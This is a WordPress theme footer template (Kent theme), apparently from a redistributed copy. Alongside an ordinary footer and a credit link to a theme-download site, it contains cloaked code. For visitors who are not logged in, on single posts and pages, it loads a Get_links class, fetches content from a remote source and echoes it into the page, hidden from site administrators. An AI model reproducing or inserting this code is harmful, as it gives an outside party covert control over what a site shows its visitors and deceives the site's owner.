<?php
/**
 * Theme Footer
 *
 * @package Kent
 */

	get_sidebar();
?>
		<footer role="contentinfo" id="footer">
			<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать темы для сайта" target="_blank">Темы wordpress</a> &ndash; <a href="http://prothemedesign.com/" target="_blank">Kent</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
		</footer>
	</div>
</div>

<?php wp_footer(); ?>

</body>
</html>